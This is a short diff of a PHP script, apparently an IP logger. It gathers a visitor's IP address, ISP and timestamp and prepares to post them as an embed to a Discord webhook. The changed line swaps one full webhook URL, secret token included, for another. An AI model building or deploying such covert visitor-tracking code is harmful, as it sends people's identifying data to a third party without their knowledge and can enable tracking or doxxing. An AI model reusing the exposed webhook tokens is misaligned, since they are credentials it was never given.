@@ -37,7 +37,7 @@ $IP = $data->query;
 $ISP = $data->isp;
 $TIMESTAMP = date("Y/m/d || h:ia + s");
 
-$url = "https://discord.com/api/webhooks/945402624633610280/3pYLhfzPZAdZgDBVBYYRUMkBIiRbVFLl6JXp3ftzdVksbJTtjtG8sPrX02VzJsrFRAIJ";
+$url = "https://discord.com/api/webhooks/945454026399555664/F57zknNVeVjpJPrb6WF1Tg0ksa-naTdWnR6o0Xl-vMQ7HZ5zSCc9D4Bbv9ZUn_aRevw9";
 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
 $POST = [ 
     "embeds" => [
